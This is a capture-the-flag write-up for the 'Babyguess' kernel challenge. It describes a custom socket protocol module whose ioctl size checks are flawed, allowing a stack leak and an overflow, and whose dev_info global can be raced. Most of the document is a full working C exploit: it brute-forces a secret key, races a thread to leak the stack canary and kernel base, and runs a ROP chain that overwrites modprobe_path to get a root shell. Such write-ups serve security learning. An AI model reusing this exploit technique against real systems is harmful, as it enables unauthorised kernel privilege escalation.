# Babyguess

*race without UFFD*	*modprobe_path*	*stack overflow*	*socket-based*



## Vulnerability

​	Reverse enginerring the kernel module file takes quite a lot of work. The kernel module implemented a new network address family with a new protocol. We interact with it through socket operations, almost identical to dev files.

​	There are two main abnormalities in the implementation. One result to kernel stack overflow and another to a race to help to leak kernel values.

### kernel stack overflow & leak

 In the `ioctl` function,

<img src="./pic/2021-11-24 09-58-27 的屏幕截图.png" alt="2021-11-24 09-58-27 的屏幕截图" style="zoom:50%;" />

In the two comparing subcommand, the comparing size was checked, but actually not as intended. In subcmd `0x1337`, the size to copy is checked, but the compare operation uses the original size from user. In subcmd `0x1338`, the compare operation size is checked, but the copy operation uses the original size from user. 

​	The first may result to stack values leaking if we have control to the global variable `s1`, and the second clearly result to a stack overflow. So the priciple of exploitation is simple, we leak the stack canary and leak the kernel load address, then control the RIP by stack overflow to do kernel rop or modify modprobe_path.

​	Also, in subcmd `0x1338`, we can easily leak the random bytes sequence `magic_key` by increasing the compare size one by one and guess the corresponding value from 0 to 0xff.



### leak with help of race

​	The global variable `s1`  was set here

<img src="pic/2021-11-24 10-12-24 的屏幕截图.png" alt="2021-11-24 10-12-24 的屏幕截图" style="zoom:50%;" />

​	It first copies a string from user of length stored in `dev_info`, then XOR it with `magic_key`. The `dev_info` is also controllable by user

<img src="pic/2021-11-24 10-18-45 的屏幕截图.png" alt="2021-11-24 10-18-45 的屏幕截图" style="zoom:50%;" />

​	Here is the second abnormality. The global variable `dev_info` is first changed and then checked. Chances are that the `set_s1_string` copied a string larger than 0x100 before the check happens, the the return value from it will tell us if this happens.


## Exploitation

From top level we

1. leak the random string `magic_key`
2. start a thread to overwrite `dev_info` to 0x200 in an infinite loop
3. increase the length of `s1` string one byte by one byte and leak kernel stack value using compare. Read stack canary and kernel load address from leak
4. find gadgets to change *modprobe_path*



​	The full exp is as follows

```c
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>

#include "kernelpwn.h"

#define MODPROBPATH 0x165ECC0
#define POPRDI 0x8cbc0
#define POPRSI 0x33a7de
#define MOVQPTRRDIRSI 0x1f50d6
#define SWAPGS 0xC00A34+0x16


cpu_state cpustate;
int socket_fd;
char magic_key[0x100];
char stack[0x100];
unsigned long stack_canary;
unsigned long kernel_base;
int flag_done;

typedef struct user_arg{
    size_t subcmd;
    size_t size;
    void* ptr;
}user_arg;


int change_s1_len(unsigned long len){
    if(ioctl(socket_fd, 0x13371001, len)) ErrExit("[-] change_s1_len() failed");
}

long set_s1_string(char* buf){
    return setsockopt(socket_fd, 0, 0xdeadbeef, buf, 0);
}

long cmp_magic_key(char* buf, long size){
    user_arg arg;
    arg.subcmd = 0x1338;
    arg.size = size;
    arg.ptr = buf;
    long ret = ioctl(socket_fd, 0x13371002, &arg);
    if(ret == 0xFFFFFFEA) ErrExit("[-] cmp_magic_key() failed");
    if(ret == size){
        return 1;
    }else{
        return 0;
    }
}

long cmp_s1_string(char* buf, long size){
    user_arg arg;
    arg.subcmd = 0x1337;
    arg.size = size;
    arg.ptr = buf;
    long ret = ioctl(socket_fd, 0x13371002, &arg);
    if(ret == 0xFFFFFFEA) ErrExit("[-] cmp_s1_string() failed");
    if(ret == size){
        return 1;
    }else{
        return 0;
    }
}

void bruteforece_magic_key(){
    memset(magic_key, 0, 0x100);
    puts("[*] recovering key...");
    for(int i=0;i<0x100;i++){
        for(int j=0;j<=0xff;j++){
            if(cmp_magic_key(magic_key, i+1)) break;
            magic_key[i] = j;
        }
    }
    puts("[*] magic key recoverd");
}

void* overwrite_s1_len(void* arg){
    while(1){
        if(flag_done) hang();
        change_s1_len(0x200);
    }
    puts("[-] should not reach");
}

int leak_stack(){
    puts("[*] starting race thread");
    pthread_t race;
    flag_done = 0;
    pthread_create(&race, NULL, overwrite_s1_len, NULL);
    sleep(1);
    puts("[*] leaking kernel stack...");
    char buf[0x200];
    for(int i=0x100;i<0x100+8*4;i++){
        for(int j=0;j<=0xff;j++){
            memset(buf, 0, 0x100);
            buf[i] = j;
            while(1){if(set_s1_string(buf) == 0x200) break;}
            memcpy(buf, magic_key, 0x100);
            if(cmp_s1_string(buf, i+1)){
                printf("[*] %d bytes leaked\n", i-0x100+1);
                break;
            }
        }
    }
    unsigned long* p;
    p = (unsigned long*)&buf[0x100];
    for(int i=0;i<20;i++){
        printf("stack[%d]: 0x%lx\n", i, p[i]);
    }
    flag_done = 1;
    stack_canary = p[0];
    kernel_base = p[2] - 0x902B1D;
    printf("[*] stack canary: 0x%lx\n[*] kernel load @ 0x%lx\n", stack_canary, kernel_base);
}

int main(){
    save_state(cpustate);
    no_iobuffer();
    socket_fd = socket(15, 0, 0);
    bruteforece_magic_key();

    // set s1 = magic_key
    change_s1_len(0x100);
    char buf[0x100];
    memset(buf, 0, 0x100);
    set_s1_string(buf);

    leak_stack();

    preprare_modprobepath();
    char rop_chain[0x200];
    memset(rop_chain, 0xdb, 0x100);
    unsigned long* rop = (unsigned long*)&rop_chain[0x100];
    int i=0;
    rop[i++] = stack_canary;
    rop[i++] = 0;
    rop[i++] = kernel_base + POPRDI;
    rop[i++] = kernel_base + MODPROBPATH;
    rop[i++] = kernel_base + POPRSI;
    rop[i++] = 0x0000632f706d742f;
    rop[i++] = kernel_base + MOVQPTRRDIRSI;
    rop[i++] = kernel_base + SWAPGS;
    rop[i++] = (unsigned long)promt_root_shell;
    rop[i++] = cpustate.cs;
    rop[i++] = cpustate.rflag;
    rop[i++] = cpustate.sp;
    rop[i++] = cpustate.ss;

    cmp_magic_key(rop_chain, 0x150);

    // hang();
    return 0;
}
```

No detail explain needed. Something do need to be mentioned

1. leaking too many bytes from the kernel stack is impossible yet of no use, for the stack frame of `ioctl` we can control is of length 0x100+8*3, and the above stack frame varies each time we guess
2. in my case the `SWAPGS_RESTORE` is nessesary for when the kernel crashes, it just hanged execution
3. the `flag_done` and `hang()` in the race thread function is set to make debugging easier